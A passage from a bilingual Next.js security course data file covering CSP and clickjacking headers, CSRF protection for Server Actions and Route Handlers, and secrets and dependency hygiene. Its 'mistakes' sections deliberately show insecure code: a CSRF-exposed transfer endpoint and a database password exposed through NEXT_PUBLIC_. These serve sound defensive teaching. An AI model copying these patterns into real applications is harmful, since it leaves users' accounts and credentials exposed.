## \`X-Frame-Options\` aur clickjacking, briefly

Ek related par distinct attack, clickjacking, ek victim ko kuch click
karne ke liye trick karta hai aapki site pe ise (invisibly) overlay karke
ek \`<iframe>\` ke andar ek attacker ke page pe, kuch bilkul aur ki tarah
disguised. \`X-Frame-Options: DENY\` (ya CSP equivalent,
\`frame-ancestors 'none'\`) set karna aapke pages ko bilkul ek frame mein
embed hone se rokta hai, is specific attack ko band karte hue.`,

    examples: [
      {
        title: 'A configured security header set including CSP, plus what Server Actions already handle',
        titleHi: 'Ek configured security header set CSP samet, plus Server Actions kya already handle karte hain',
        codeJs: `// next.config.js — app-wide security headers
module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          { key: 'X-Frame-Options', value: 'DENY' },
          { key: 'X-Content-Type-Options', value: 'nosniff' },
          { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
          {
            key: 'Content-Security-Policy',
            value: [
              "default-src 'self'",
              "script-src 'self'",
              "style-src 'self' 'unsafe-inline'", // some CSS-in-JS setups genuinely need this
              "img-src 'self' data: https:",
              "frame-ancestors 'none'",
            ].join('; '),
          },
        ],
      },
    ];
  },
};

// app/actions.js — Next.js verifies the request's origin BEFORE this runs
'use server';
export async function transferFunds(toAccount, amount) {
  // If this were called from a forged cross-origin request, Next.js's
  // built-in origin check would already have rejected it before this
  // function body ever executes.
  await db.transfer.create({ data: { toAccount, amount } });
}`,
        codeTs: `// next.config.js — app-wide security headers
module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          { key: 'X-Frame-Options', value: 'DENY' },
          { key: 'X-Content-Type-Options', value: 'nosniff' },
          { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
          {
            key: 'Content-Security-Policy',
            value: [
              "default-src 'self'",
              "script-src 'self'",
              "style-src 'self' 'unsafe-inline'", // some CSS-in-JS setups genuinely need this
              "img-src 'self' data: https:",
              "frame-ancestors 'none'",
            ].join('; '),
          },
        ],
      },
    ];
  },
};

// app/actions.ts — Next.js verifies the request's origin BEFORE this runs
'use server';
export async function transferFunds(toAccount: string, amount: number) {
  // If this were called from a forged cross-origin request, Next.js's
  // built-in origin check would already have rejected it before this
  // function body ever executes.
  await db.transfer.create({ data: { toAccount, amount } });
}`,
        code: `module.exports = {
  async headers() {
    return [{
      source: '/:path*',
      headers: [
        { key: 'X-Frame-Options', value: 'DENY' },
        { key: 'Content-Security-Policy', value: "default-src 'self'; script-src 'self'" },
      ],
    }];
  },
};`,
        output:
          "Every response from the app carries these headers. A forged request attempting to invoke transferFunds from a different origin is rejected by Next.js's built-in check before the function body runs. Even if an XSS payload were somehow injected into a page, the CSP would block it from loading a script from any origin other than the app's own.",
        explain:
          "The headers and CSP config apply to every route uniformly via the source: '/:path*' matcher, while the Server Action's origin protection is a separate, automatic mechanism specific to that invocation path — together they cover both the CSRF and XSS-damage-limitation concerns from two different angles.",
        explainHi:
          "Headers aur CSP config source: '/:path*' matcher ke through har route pe uniformly apply hote hain, jabki Server Action ka origin protection ek separate, automatic mechanism hai us invocation path ke liye specific — saath mein wo CSRF aur XSS-damage-limitation concerns ko do alag angles se cover karte hain.",
      },
    ],

    mistakes: [
      {
        wrong: `// Assuming a Route Handler gets the same automatic CSRF protection as a Server Action
// app/api/transfer/route.js
export async function POST(request) {
  const { toAccount, amount } = await request.json();
  // No origin check here — this is NOT a Server Action, so Next.js's
  // built-in protection doesn't apply. If this is cookie-authenticated
  // and reachable cross-origin, it's vulnerable to CSRF.
  await db.transfer.create({ data: { toAccount, amount } });
  return Response.json({ ok: true });
}`,
        right: `// Explicitly checking the origin for a cookie-authenticated Route Handler
export async function POST(request) {
  const origin = request.headers.get('origin');
  if (origin !== process.env.APP_URL) {
    return new Response('Forbidden', { status: 403 });
  }
  const { toAccount, amount } = await request.json();
  await db.transfer.create({ data: { toAccount, amount } });
  return Response.json({ ok: true });
}`,
        why: "Next.js's automatic CSRF-relevant origin check is specific to the Server Actions invocation mechanism — it does not extend to hand-written Route Handlers, which need their own explicit origin verification (or another CSRF mitigation) if they're cookie-authenticated and perform state-changing operations.",
        whyHi:
          "Next.js ka automatic CSRF-relevant origin check Server Actions invocation mechanism ke liye specific hai — ye hand-written Route Handlers tak extend nahi hota, jinhe apna khud ka explicit origin verification chahiye (ya doosra CSRF mitigation) agar wo cookie-authenticated hain aur state-changing operations perform karte hain.",
      },
    ],

    realWorld: [
      {
        en: "A banking application's fund-transfer feature, if built as a Route Handler rather than a Server Action, explicitly verifies the request's Origin header (or uses a dedicated CSRF token) on top of normal authentication — because the consequence of a successful CSRF attack against a money-moving endpoint is severe enough that relying on implicit protections alone would be an unacceptable risk.",
        hi: 'Ek banking application ka fund-transfer feature, agar ek Route Handler ki tarah banaya gaya hai ek Server Action ke bajaye, explicitly request ke Origin header ko verify karta hai (ya ek dedicated CSRF token use karta hai) normal authentication ke upar — kyunki ek money-moving endpoint ke against ek successful CSRF attack ka consequence itna severe hai ki sirf implicit protections pe rely karna ek unacceptable risk hoga.',
      },
    ],

    interviewQA: [
      {
        q: 'What makes CSRF possible, mechanically, given how browsers handle cookies?',
        qHi: 'Browsers cookies ko kaise handle karte hain ye dekhte hue, CSRF ko mechanically kya possible banata hai?',
        a: "Browsers automatically attach a domain's cookies to every request made to that domain, regardless of which page actually triggered the request. This means a malicious page on an unrelated site can cause a victim's browser to send a request to another site (like their bank) with the victim's valid session cookie attached automatically, without the attacker needing to know or steal that cookie.",
        aHi: 'Browsers automatically ek domain ke cookies ko us domain pe har request pe attach karte hain, chahe kisi bhi page ne actually request trigger ki ho. Iska matlab hai ek unrelated site pe ek malicious page victim ke browser ko ek doosri site (jaise unka bank) ko ek request bhejne ka cause bana sakta hai victim ke valid session cookie ke automatically attached hone ke saath, attacker ko us cookie ko jaanne ya steal karne ki zaroorat ke bina.',
      },
      {
        q: 'Does a Content Security Policy prevent XSS from occurring?',
        qHi: 'Kya ek Content Security Policy XSS ko hone se rokta hai?',
        a: "No — CSP doesn't prevent an XSS injection from happening; it limits what an injected payload can actually do by restricting which sources scripts, styles, and other resources are allowed to load from. It's a second layer of defense, not a replacement for proper escaping and sanitization, which remain the primary defense.",
        aHi: 'Nahi — CSP ek XSS injection ko hone se nahi rokta; ye limit karta hai ki ek injected payload actually kya kar sakta hai, restrict karke ki kaunse sources se scripts, styles, aur doosre resources load hone allowed hain. Ye defense ki ek second layer hai, proper escaping aur sanitization ka replacement nahi, jo primary defense bane rehte hain.',
      },
    ],

    exercises: [
      {
        task: "An app has a 'change password' feature implemented as a Route Handler at /api/change-password, authenticated via a cookie. Explain whether this needs explicit CSRF protection and why, contrasting it with an equivalent feature implemented as a Server Action.",
        taskHi: 'Ek app mein ek \'change password\' feature hai jo /api/change-password pe ek Route Handler ki tarah implement hai, ek cookie ke through authenticated. Explain karo ki kya ise explicit CSRF protection chahiye aur kyun, ise ek equivalent feature se contrast karte hue jo ek Server Action ki tarah implement hai.',
        hint: "Recall which mechanism gets Next.js's automatic origin check and which doesn't.",
        hintHi: 'Yaad karo kaunse mechanism ko Next.js ka automatic origin check milta hai aur kaunse ko nahi.',
      },
    ],

    keyTakeaways: [
      "CSRF works because browsers automatically attach a domain's cookies to every request to that domain regardless of which page triggered it — an attacker doesn't need to steal a cookie, just get the victim's own browser to send an unintended request.",
      "Next.js's Server Actions include a built-in origin check that rejects requests not originating from the app's own origin, providing meaningful default CSRF protection specifically for that invocation mechanism.",
      "This protection does not extend to hand-written Route Handlers — cookie-authenticated Route Handlers performing state-changing operations need their own explicit CSRF mitigation.",
      "A Content Security Policy is a second layer of defense that limits what an XSS payload can do (by restricting allowed script/style/frame sources) — it does not prevent XSS from occurring and is not a substitute for proper escaping and sanitization.",
    ],
    keyTakeawaysHi: [
      'CSRF isliye kaam karta hai kyunki browsers automatically ek domain ke cookies ko us domain pe har request pe attach karte hain chahe kisi bhi page ne ise trigger kiya ho — ek attacker ko cookie steal karne ki zaroorat nahi, sirf victim ke apne browser se ek unintended request bhejwane ki zaroorat hai.',
      "Next.js ke Server Actions mein ek built-in origin check hai jo un requests ko reject karta hai jo app ke apne origin se originate nahi hoti, us specific invocation mechanism ke liye meaningful default CSRF protection provide karte hue.",
      'Ye protection hand-written Route Handlers tak extend nahi hota — cookie-authenticated Route Handlers jo state-changing operations perform karte hain unhe apna khud ka explicit CSRF mitigation chahiye.',
      'Ek Content Security Policy defense ki ek second layer hai jo limit karta hai ki ek XSS payload kya kar sakta hai (allowed script/style/frame sources ko restrict karke) — ye XSS ko hone se nahi rokta aur proper escaping aur sanitization ka substitute nahi hai.',
    ],
  },

  /* ══════════════════════ Lesson 3 ══════════════════════ */
  {
    slug: 'nextjs-secrets-management-dependency-audits',
    title: 'Secrets Management & Dependency/Supply-Chain Audits',
    titleHi: 'Secrets Management Aur Dependency/Supply-Chain Audits',
    description:
      "A secret accidentally exposed to the client (via NEXT_PUBLIC_*, a committed .env file, or a bundled dependency) is effectively public the instant it ships. A vulnerable or malicious dependency is a risk you inherit from every package your app depends on, not just the code you wrote yourself.",
    descriptionHi:
      'Ek secret jo accidentally client ko expose ho jata hai (NEXT_PUBLIC_* ke through, ek committed .env file, ya ek bundled dependency) effectively public ho jata hai jis instant ye ship hota hai. Ek vulnerable ya malicious dependency ek risk hai jo aap har us package se inherit karte ho jispe aapka app depend karta hai, sirf us code se nahi jo aapne khud likha.',
    difficulty: 'HARD',
    duration: 22,
    order: 3,

    analogy: {
      en: "**Writing your house key's shape on a public noticeboard versus keeping it in your pocket. And buying groceries from a hundred different small shops, any one of which could slip something into your bag without you checking each one.** A secret prefixed NEXT_PUBLIC_ is like posting your key's exact shape on a noticeboard everyone walks past — technically the key still 'works,' but its secrecy is now meaningless, because anyone who looked can make a copy. Separately, a modern app's dependency tree is like sourcing groceries from a hundred small shops (direct AND indirect dependencies) — you inspected the first few carefully, but the sheer number means a single compromised or careless one further down that chain can slip something harmful into your final basket without your ever having directly dealt with that shop.",
      hi: "Ek ghar ki key ki shape ko ek public noticeboard pe likhna versus ise apni pocket mein rakhna. Aur hundred alag chhoti dukanon se groceries khareedna, jinme se koi bhi aapke bag mein kuch daal sakti hai bina aapke har ek check kiye. Ek secret jo NEXT_PUBLIC_ prefixed hai ek noticeboard pe aapki key ki exact shape post karne jaisa hai jise har koi guzarte hue dekhta hai — technically key abhi bhi 'kaam karti hai,' par uski secrecy ab meaningless hai, kyunki jisne bhi dekha wo ek copy bana sakta hai. Separately, ek modern app ka dependency tree hundred chhoti dukanon se groceries source karne jaisa hai (direct AUR indirect dependencies) — aapne pehli kuch ko carefully inspect kiya, par sheer number ka matlab hai ek single compromised ya careless dukaan us chain mein aage kuch harmful aapki final basket mein slip kar sakti hai bina aapke kabhi directly us dukaan se deal kiye.",
    },

    simple: `**The NEXT_PUBLIC_ prefix is not a naming convention — it's a
literal instruction to bundle a value into client-side JavaScript:**

\`\`\`env
# .env
DATABASE_URL="postgresql://..."        # server-only, NEVER reaches the browser
STRIPE_SECRET_KEY="sk_live_..."         # server-only, NEVER reaches the browser
NEXT_PUBLIC_ANALYTICS_ID="UA-12345"     # bundled into client JS — visible to EVERYONE
\`\`\`

**The rule: never prefix a genuine secret with \`NEXT_PUBLIC_\`.** A value
with that prefix is compiled directly into the JavaScript bundle sent to
every visitor's browser — viewable by anyone who opens developer tools,
regardless of any authentication on your site. It's meant specifically for
values that are ALREADY meant to be public (an analytics tracking ID, a
publishable Stripe key designed to be exposed).

**Never commit real secrets to git, even in a private repo:**

\`\`\`
# .gitignore
.env
.env.local
.env*.local
\`\`\`

A \`.env\` file with real credentials, committed even once, remains in git
HISTORY forever — deleting the file in a later commit does not remove it
from earlier commits, which is why a leaked secret must be ROTATED
(replaced with a new one), not just removed from the current file.

**Dependency auditing — your app's real attack surface includes every
package it depends on:**

\`\`\`bash
npm audit                    # checks installed packages against known vulnerabilities
npm audit fix                # attempts to automatically upgrade to safe versions
\`\`\`

**Why this matters beyond "keep dependencies updated":** a real
supply-chain attack doesn't target your application code directly — it
targets a popular package deep in your dependency tree (one you may never
have directly installed, only pulled in transitively), compromising every
application that depends on it, including yours, without your code ever
changing. Regularly auditing dependencies, and being deliberate about
adding new ones (does this package genuinely need to exist in this app,
who maintains it, how many other packages transitively pull it in), is
security work, not just hygiene.`,

    simpleHi: `**\`NEXT_PUBLIC_\` prefix ek naming convention nahi hai — ye ek literal
instruction hai ek value ko client-side JavaScript mein bundle karne ka:**

\`\`\`env
# .env
DATABASE_URL="postgresql://..."        # server-only, browser tak KABHI nahi pahunchta
STRIPE_SECRET_KEY="sk_live_..."         # server-only, browser tak KABHI nahi pahunchta
NEXT_PUBLIC_ANALYTICS_ID="UA-12345"     # client JS mein bundled — HAR KISI ko visible
\`\`\`

**Rule: ek genuine secret ko kabhi \`NEXT_PUBLIC_\` se prefix mat karo.**
Us prefix wala ek value directly us JavaScript bundle mein compile hota
hai jo har visitor ke browser ko bheja jata hai — kisi ke bhi dwara
viewable jo developer tools kholta hai, chahe aapki site pe koi bhi
authentication ho. Ye specifically un values ke liye hai jo ALREADY public
hone ke liye meant hain (ek analytics tracking ID, ek publishable Stripe
key jo expose hone ke liye design ki gayi).

**Real secrets ko kabhi git mein commit mat karo, ek private repo mein
bhi nahi:**

\`\`\`
# .gitignore
.env
.env.local
.env*.local
\`\`\`

Ek \`.env\` file real credentials ke saath, ek baar bhi committed, git
HISTORY mein hamesha ke liye rehti hai — file ko baad ke commit mein
delete karna ise earlier commits se remove nahi karta, yahi wajah hai ki
ek leaked secret ko ROTATE karna chahiye (ek naye se replace karna),
sirf current file se hatana nahi.

**Dependency auditing — aapke app ka real attack surface har us package
ko include karta hai jispe ye depend karta hai:**

\`\`\`bash
npm audit                    # installed packages ko known vulnerabilities ke against check karta hai
npm audit fix                # automatically safe versions tak upgrade karne ki koshish karta hai
\`\`\`

**Ye "dependencies ko updated rakho" se pare kyun matter karta hai:** ek
real supply-chain attack aapke application code ko directly target nahi
karta — ye ek popular package ko target karta hai aapke dependency tree
mein deep (ek jo aapne shayad kabhi directly install nahi kiya, sirf
transitively pull kiya), har application ko compromise karte hue jo isi
pe depend karta hai, aapke samet, bina aapke code ke kabhi badle. Dependencies
ko regularly audit karna, aur naye add karne mein deliberate hona (kya is
package ko genuinely is app mein exist karna chahiye, ise kaun maintain
karta hai, kitne aur packages transitively ise pull karte hain), security
kaam hai, sirf hygiene nahi.`,

    content: `## Why NEXT_PUBLIC_ deserves this much attention

The NEXT_PUBLIC_ mechanism is a genuinely useful, intentional feature —
some values (a public API endpoint URL, an analytics ID) really do need
to reach client-side code. The risk isn't the feature itself; it's a
developer reaching for the prefix out of convenience for a value that was
never meant to be public (a habit of "just add NEXT_PUBLIC_ so I can read
it in this client component" without stopping to ask whether the value is
actually safe to expose). Once compiled into the client bundle, there is
no way to "un-expose" it short of rotating the underlying credential
entirely.

## Why deleting a committed secret from git doesn't fix the exposure

Git is fundamentally a history of every change ever made — removing a
file's current content in a new commit doesn't erase its content from
earlier commits, which remain fully accessible via git's history (\`git
log\`, \`git show\`, cloning the repo). A secret committed even briefly must
be treated as permanently compromised and rotated, regardless of how
quickly it was "fixed" in a subsequent commit — this is a subtlety that
surprises developers who assume deleting a file is equivalent to it never
having existed.

## Why supply-chain risk is fundamentally different from "your own bugs"

A vulnerability in code you wrote is something you can find and fix
directly. A vulnerability in a transitive dependency (a package your
package depends on, which you never explicitly chose or reviewed) is a
risk you've inherited without necessarily even knowing it exists — modern
JavaScript projects commonly have hundreds or thousands of transitive
dependencies. This is precisely why supply-chain attacks (compromising a
widely-used package to affect everyone downstream) have become an
increasingly common attack vector: one successful compromise reaches far
more victims than attacking any single application directly.

## What \`npm audit\` actually checks, and its limits

\`npm audit\` compares your installed dependency versions against a
database of known, publicly disclosed vulnerabilities — it's a real,
useful baseline check, but it can only catch vulnerabilities that have
already been discovered and disclosed. It won't catch a genuinely novel
or undisclosed vulnerability, and it won't evaluate whether a package's
maintainer is trustworthy or whether a dependency is doing something
suspicious that hasn't yet been classified as a known CVE. This is why
being deliberate about which dependencies to add in the first place
(preferring well-maintained, widely-used, minimal-dependency packages)
complements rather than replaces regular auditing.

## Environment variable hygiene as an ongoing practice, not a one-time setup

Beyond the initial \`.gitignore\` configuration, teams benefit from a
habit of periodically reviewing which environment variables actually
exist across their deployment environments, removing ones no longer
used (each one is a potential exposure surface even if currently
unused), and confirming that production secrets are never the same values
used in a shared development or staging environment with looser access
controls.`,

    contentHi: `## NEXT_PUBLIC_ itna zyada attention kyun deserve karta hai

NEXT_PUBLIC_ mechanism ek genuinely useful, intentional feature hai —
kuch values (ek public API endpoint URL, ek analytics ID) really client-
side code tak pahunchne chahiye. Risk feature khud nahi hai; ye ek
developer ka convenience ke liye prefix ko reach karna hai ek value ke
liye jo kabhi public hone ke liye meant nahi thi (ek habit "bas
NEXT_PUBLIC_ add kar du taaki main ise is client component mein padh
saku" bina ruke ye poochhe ki kya value actually expose karne ke liye
safe hai). Ek baar client bundle mein compile hone ke baad, ise "un-expose"
karne ka koi tareeka nahi hai underlying credential ko poori tarah rotate
karne ke alawa.

## Git se ek committed secret ko delete karna exposure ko kyun fix nahi karta

Git fundamentally har badlav ki ek history hai jo kabhi kiya gaya — ek
file ke current content ko ek naye commit mein remove karna uska content
earlier commits se mita nahi deta, jo git ki history ke through (\`git
log\`, \`git show\`, repo clone karna) poori tarah accessible rehta hai. Ek
secret jo briefly bhi committed hua use permanently compromised treat
karna chahiye aur rotate karna chahiye, chahe ye kitni bhi jaldi ek
subsequent commit mein "fix" hua ho — ye ek subtlety hai jo un developers
ko surprise karti hai jo assume karte hain ki ek file delete karna uske
kabhi exist na karne ke equivalent hai.

## Supply-chain risk fundamentally "aapke apne bugs" se alag kyun hai

Aapke likhe code mein ek vulnerability aisi cheez hai jise aap directly
find aur fix kar sakte ho. Ek transitive dependency mein ek vulnerability
(ek package jispe aapka package depend karta hai, jise aapne kabhi
explicitly choose ya review nahi kiya) ek risk hai jo aapne inherit kiya
bina zaroori taur pe ye jaante hue ki ye exist karta hai — modern
JavaScript projects commonly sainkado ya hazaron transitive dependencies
rakhte hain. Yahi precisely wajah hai ki supply-chain attacks (ek widely-
used package ko compromise karna sab downstream affect karne ke liye)
ek increasingly common attack vector ban gaye hain: ek successful
compromise kisi bhi single application ko directly attack karne se kaafi
zyada victims tak pahunchta hai.

## \`npm audit\` actually kya check karta hai, aur iski limits

\`npm audit\` aapke installed dependency versions ko known, publicly
disclosed vulnerabilities ke ek database ke against compare karta hai —
ye ek real, useful baseline check hai, par ye sirf un vulnerabilities ko
catch kar sakta hai jo already discover aur disclose ho chuki hain. Ye ek
genuinely novel ya undisclosed vulnerability ko catch nahi karega, aur ye
evaluate nahi karega ki kya ek package ka maintainer trustworthy hai ya
kya ek dependency kuch suspicious kar raha hai jo abhi tak ek known CVE
ki tarah classify nahi hua. Yahi wajah hai ki pehli jagah kaunse
dependencies add karni hain iske baare mein deliberate hona (well-
maintained, widely-used, minimal-dependency packages prefer karna) regular
auditing ko complement karta hai replace karne ke bajaye.

## Environment variable hygiene ek ongoing practice ki tarah, ek one-time setup nahi

Initial \`.gitignore\` configuration se pare, teams periodically review
karne ki habit se benefit karte hain ki actually kaunse environment
variables unke deployment environments ke across exist karte hain, un
ko remove karte hue jo ab use nahi hote (har ek ek potential exposure
surface hai chahe currently unused ho), aur confirm karte hue ki
production secrets kabhi wahi values nahi hain jo ek shared development
ya staging environment mein use hote hain looser access controls ke
saath.`,

    examples: [
      {
        title: 'Correct environment variable naming, and rotating a leaked secret',
        titleHi: 'Correct environment variable naming, aur ek leaked secret ko rotate karna',
        codeJs: `// .env — correctly scoped secrets
DATABASE_URL="postgresql://user:pass@host:5432/db"      // server-only
STRIPE_SECRET_KEY="sk_live_abc123"                        // server-only
STRIPE_WEBHOOK_SECRET="whsec_xyz789"                      // server-only
NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY="pk_live_def456"        // safe to expose — designed for this
NEXT_PUBLIC_APP_URL="https://example.com"                  // safe to expose — not a secret

// lib/stripe.js — server-only code, correctly using the SECRET key
import Stripe from 'stripe';
export const stripe = new Stripe(process.env.STRIPE_SECRET_KEY); // never NEXT_PUBLIC_

// app/checkout/CheckoutButton.js — client-side code, correctly using the PUBLISHABLE key
'use client';
import { loadStripe } from '@stripe/stripe-js';
const stripePromise = loadStripe(process.env.NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY);`,
        codeTs: `// .env — correctly scoped secrets
DATABASE_URL="postgresql://user:pass@host:5432/db"      // server-only
STRIPE_SECRET_KEY="sk_live_abc123"                        // server-only
STRIPE_WEBHOOK_SECRET="whsec_xyz789"                      // server-only
NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY="pk_live_def456"        // safe to expose — designed for this
NEXT_PUBLIC_APP_URL="https://example.com"                  // safe to expose — not a secret

// lib/stripe.ts — server-only code, correctly using the SECRET key
import Stripe from 'stripe';
export const stripe = new Stripe(process.env.STRIPE_SECRET_KEY!); // never NEXT_PUBLIC_

// app/checkout/CheckoutButton.tsx — client-side code, correctly using the PUBLISHABLE key
'use client';
import { loadStripe } from '@stripe/stripe-js';
const stripePromise = loadStripe(process.env.NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY!);`,
        code: `// Server-only secret — no NEXT_PUBLIC_ prefix
export const stripe = new Stripe(process.env.STRIPE_SECRET_KEY);
// Client-safe key — designed to be public, correctly prefixed
const stripePromise = loadStripe(process.env.NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY);`,
        output:
          "STRIPE_SECRET_KEY never appears anywhere in the client-side JavaScript bundle sent to browsers. NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY does appear there, which is fine and expected, since Stripe explicitly designed the publishable key to be safe for client-side use.",
        explain:
          "The distinction isn't arbitrary — Stripe deliberately issues two different keys with two different trust levels precisely so an application can follow this exact pattern: the secret key for privileged server-side operations, the publishable key for the narrow set of client-side operations that genuinely need it.",
        explainHi:
          "Distinction arbitrary nahi hai — Stripe deliberately do alag keys issue karta hai do alag trust levels ke saath precisely taaki ek application exactly is pattern ko follow kare: privileged server-side operations ke liye secret key, un narrow set ke client-side operations ke liye publishable key jinhe genuinely iski zaroorat hai.",
      },
    ],

    mistakes: [
      {
        wrong: `// Prefixing a genuine secret with NEXT_PUBLIC_ "just to make it easy to access"
NEXT_PUBLIC_DATABASE_URL="postgresql://user:realpassword@host:5432/db"
// This entire connection string, including the real password, is now
// compiled into every visitor's client-side JavaScript bundle — anyone
// who opens developer tools can read the database credentials directly.`,
        right: `// Keeping the secret server-only, with no NEXT_PUBLIC_ prefix
DATABASE_URL="postgresql://user:realpassword@host:5432/db"
// Only accessible in server-side code (Server Components, Server
// Actions, Route Handlers) — never bundled into client-side JavaScript.`,
        why: "NEXT_PUBLIC_ is a literal build-time instruction to Next.js to inline that value into the client bundle — there is no such thing as a 'private NEXT_PUBLIC_ variable.' Once compiled in, the value is visible to any visitor who opens their browser's developer tools, regardless of any authentication elsewhere on the site.",
        whyHi:
          "NEXT_PUBLIC_ Next.js ke liye ek literal build-time instruction hai us value ko client bundle mein inline karne ka — koi 'private NEXT_PUBLIC_ variable' jaisi cheez nahi hai. Ek baar compile hone ke baad, value kisi bhi visitor ko visible hai jo apne browser ke developer tools kholta hai, chahe site pe kahin bhi koi authentication ho.",
      },
    ],

    realWorld: [
      {
        en: "A company's automated security scanning routinely flags any git commit containing a pattern matching a common API key format (Stripe's sk_live_, AWS access keys, etc.) — and when one is genuinely found, the response is always to rotate the credential at its source immediately, not just remove it from the repository, precisely because the old value remains permanently visible in git history.",
        hi: 'Ek company ki automated security scanning routinely kisi bhi git commit ko flag karti hai jisme ek pattern ho jo ek common API key format se match kare (Stripe ka sk_live_, AWS access keys, etc.) — aur jab ek genuinely mil jaata hai, response hamesha credential ko uske source pe immediately rotate karna hota hai, sirf ise repository se remove karna nahi, precisely isliye kyunki purana value git history mein permanently visible rehta hai.',
      },
    ],

    interviewQA: [
      {
        q: 'What does the NEXT_PUBLIC_ prefix actually do, mechanically, and why is that dangerous for a genuine secret?',
        qHi: 'NEXT_PUBLIC_ prefix actually mechanically kya karta hai, aur ye ek genuine secret ke liye dangerous kyun hai?',
        a: "It's a literal build-time instruction telling Next.js to inline that environment variable's value directly into the client-side JavaScript bundle. Once compiled in, the value is readable by any visitor who inspects the page's source or opens developer tools, regardless of any authentication — there's no way to make a NEXT_PUBLIC_ value private after the fact.",
        aHi: 'Ye ek literal build-time instruction hai jo Next.js ko batata hai us environment variable ki value ko directly client-side JavaScript bundle mein inline karo. Ek baar compile hone ke baad, value kisi bhi visitor ke liye readable hai jo page ka source inspect karta hai ya developer tools kholta hai, chahe koi bhi authentication ho — baad mein ek NEXT_PUBLIC_ value ko private banane ka koi tareeka nahi hai.',
      },
      {
        q: 'Why must a secret accidentally committed to git be rotated, rather than just deleted in a later commit?',
        qHi: 'Ek secret jo accidentally git mein commit ho gaya use rotate kyun karna chahiye, sirf ek baad ke commit mein delete karne ke bajaye?',
        a: "Git preserves the full history of every commit — deleting a file's content in a new commit does not remove that content from earlier commits, which remain accessible via git log, git show, or simply cloning the repository. The only way to actually invalidate an exposed secret is to replace it with a new one at its source.",
        aHi: 'Git har commit ki poori history preserve karta hai — ek file ke content ko ek naye commit mein delete karna us content ko earlier commits se remove nahi karta, jo git log, git show, ya simply repository clone karke accessible rehte hain. Ek exposed secret ko actually invalidate karne ka ekmatra tareeka use uske source pe ek naye se replace karna hai.',
      },
    ],

    exercises: [
      {
        task: "A .env file containing a real database password was accidentally committed to a private GitHub repository three days ago and removed in a commit yesterday. List every step needed to properly remediate this, in order.",
        taskHi: 'Ek real database password rakhne wali ek .env file accidentally teen din pehle ek private GitHub repository mein commit ho gayi thi aur kal ek commit mein remove ho gayi. Har step list karo jo isse properly remediate karne ke liye chahiye, order mein.',
        hint: "Removing the file from the latest commit does not remove it from git history — think about what actually needs to change at the database/credential level, not just in the repository.",
        hintHi: 'File ko latest commit se remove karna use git history se remove nahi karta — socho ki database/credential level pe actually kya badalna chahiye, sirf repository mein nahi.',
      },
    ],

    keyTakeaways: [
      "NEXT_PUBLIC_ is a literal build-time instruction to bundle a value into client-side JavaScript, visible to any visitor — it must never be used for genuine secrets, only for values already meant to be public.",
      'A secret committed to git, even briefly, remains accessible in git history forever — deleting it in a later commit does not remove it, and the only real fix is rotating the credential at its source.',
      "A dependency vulnerability is a risk inherited from every package in an app's dependency tree, including transitive dependencies never explicitly chosen — this is fundamentally different from a bug in code the team wrote directly.",
      "npm audit checks installed packages against known, disclosed vulnerabilities — a useful baseline that complements, but doesn't replace, being deliberate about which dependencies to add in the first place.",
    ],
    keyTakeawaysHi: [
      'NEXT_PUBLIC_ ek literal build-time instruction hai ek value ko client-side JavaScript mein bundle karne ka, kisi bhi visitor ko visible — ise kabhi genuine secrets ke liye use nahi karna chahiye, sirf un values ke liye jo already public hone ke liye meant hain.',
      'Ek secret jo git mein commit hua, chahe briefly bhi, git history mein hamesha ke liye accessible rehta hai — ise ek baad ke commit mein delete karna ise remove nahi karta, aur ekmatra real fix credential ko uske source pe rotate karna hai.',
      'Ek dependency vulnerability ek risk hai jo ek app ke dependency tree ke har package se inherit hota hai, transitive dependencies samet jo kabhi explicitly choose nahi ki gayi — ye fundamentally alag hai us bug se jo team ne directly likha.',
      'npm audit installed packages ko known, disclosed vulnerabilities ke against check karta hai — ek useful baseline jo complement karta hai, replace nahi karta, pehli jagah kaunse dependencies add karni hain iske baare mein deliberate hone ko.',
    ],
  },
];
